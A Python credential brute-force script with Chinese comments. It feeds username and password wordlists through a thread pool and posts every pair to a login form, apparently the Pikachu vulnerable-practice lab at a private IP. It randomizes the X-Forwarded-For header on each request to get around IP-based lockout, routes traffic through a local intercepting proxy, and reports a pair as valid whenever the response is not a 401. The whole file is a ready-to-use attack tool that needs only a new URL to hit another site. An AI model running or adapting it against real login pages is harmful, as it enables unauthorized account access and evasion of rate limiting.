import requests, urllib3, random, os, traceback, time
from requests.exceptions import ConnectTimeout, ConnectionError, ReadTimeout
from concurrent import futures
from datetime import datetime, timedelta

# 禁用https警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 字典路径，置空就不读取
#USERNAME_DIC = "/root/bruteforce/username.txt"
#PASSWORD_DIC = "/root/bruteforce/password.txt"
USERNAME_DIC = "D:\\Bruteforce\\username.txt"
PASSWORD_DIC = "D:\\Bruteforce\\password.txt"

# 字典
USERNAME = []
PASSWORD = []

# 只爆破一个账号
ONLY_ONCE = False

# 爆破后暂停时长，单位秒
DELAY = 1

# 线程池
THREAD = 1

# 是否使用代理
USE_PROXY = True

# 设置代理
PROXIES = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

# 加载用户名字典
try:
    if USERNAME_DIC:
        with open(USERNAME_DIC, "r") as f:
            USERNAME = f.readlines()
except Exception as e:
    print(f"[x] Cannot open '{USERNAME_DIC}' file {e}")
    os._exit(0)

# 加载密码字典
try:
    if PASSWORD_DIC:
        with open(PASSWORD_DIC, "r") as f:
            PASSWORD = f.readlines()
except Exception as e:
    print(f"[x] Cannot open '{PASSWORD_DIC}' file {e}")
    os._exit(0)

# 设置Headers
HEADERS = requests.utils.default_headers()
HEADERS.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0",
    "X-Requested-With": "XMLHttpRequest",
    "Cookie": "PHPSESSID=123"
})

# 随机IP生成
def random_ipv4():
    return ".".join(str(random.randint(0,255)) for _ in range(4))

# 爆破函数，返回 (has_exception, found)
def bruteforce(username, password):

    time.sleep(DELAY)
    
    try:
        url = "http://172.29.133.44/vul/burteforce/bf_form.php"
        data = {
            "username": username,
            "password": password,
            "submit": "Login"
        }
        
        HEADERS.update({
            "X-Forwarded-For": random_ipv4()
        })
        response = requests.post(
            url,
            data=data,
            verify=False,
            headers=HEADERS,
            proxies=PROXIES if USE_PROXY else None,
            allow_redirects=False,
            timeout=7)

        # if len(response.content) != 61:
        # if response.status_code != 401:
        # if "Failed" not in response.text:

        if response.status_code != 401:
            print(f"[+] {datetime.now().strftime('%H:%M:%S')} Found {username}:{password}\t=> code:{response.status_code} length:{len(response.content)}")
            return False, True

        return False, False

    except (ConnectTimeout, ConnectionError, ReadTimeout) as e:
        print(f"[x] {datetime.now().strftime('%H:%M:%S')} Encounter error: {e}")
        return True, False

    except Exception as e:
        print(f"[x] {datetime.now().strftime('%H:%M:%S')} {username}:{password} Encounter error: {e}, detail:")
        print(traceback.format_exc())
        return True, False

# 开始爆破
print(f"[+] {datetime.now().strftime('%H:%M:%S')} task start")

with futures.ThreadPoolExecutor(max_workers=THREAD) as executor:

    tasks = set()
    total = len(USERNAME) * len(PASSWORD)
    finished = 0
    exception_count = 0 # 连续异常计数
    time_for_now = datetime.now()

    print(f"[!] {datetime.now().strftime('%H:%M:%S')} {finished}/{total} ({finished // total}%) finished")

    try:
        for username_index, username in enumerate(USERNAME):
            for password_index, password in enumerate(PASSWORD):

                # 清除右边的换行
                username = username.rstrip()
                password = password.rstrip()

                # 防止队列过长
                completed = set()
                if len(tasks) >= THREAD:
                    completed, tasks = futures.wait(tasks, return_when=futures.FIRST_COMPLETED)
                
                # 检查结果
                stop = False
                for task in completed:

                    # 完成计数+1
                    finished += 1

                    # 检查异常
                    has_exception, found = task.result()
                    if has_exception:
                        exception_count += 1
                        continue

                    # 是否仅爆破一个账号
                    exception_count = 0
                    if ONLY_ONCE and found:
                        stop = True
                        break
                
                # 检查是否遇到太多异常
                if exception_count >= 5:
                    print("[x] {datetime.now().strftime('%H:%M:%S')} Too much error. Quiting.")
                    break
                
                # 检查是否需要停止
                if stop == True:
                    break
                
                # 新建线程
                task = executor.submit(bruteforce, username, password)
                tasks.add(task)

                # 5分钟显示一次进度
                if datetime.now() - time_for_now >= timedelta(minutes=5):
                    time_for_now = datetime.now()
                    print(f"[!] {datetime.now().strftime('%H:%M:%S')} {finished}/{total} ({finished // total}%) finished")

            else:
                continue
            break
        
        print("[!] Wait for all threads exit.")
    
    except KeyboardInterrupt:

        print("[!] Get Ctrl-C, wait for all threads exit.")
        futures.wait(tasks, return_when=futures.ALL_COMPLETED)

print(f"[+] {datetime.now().strftime('%H:%M:%S')} task finished")
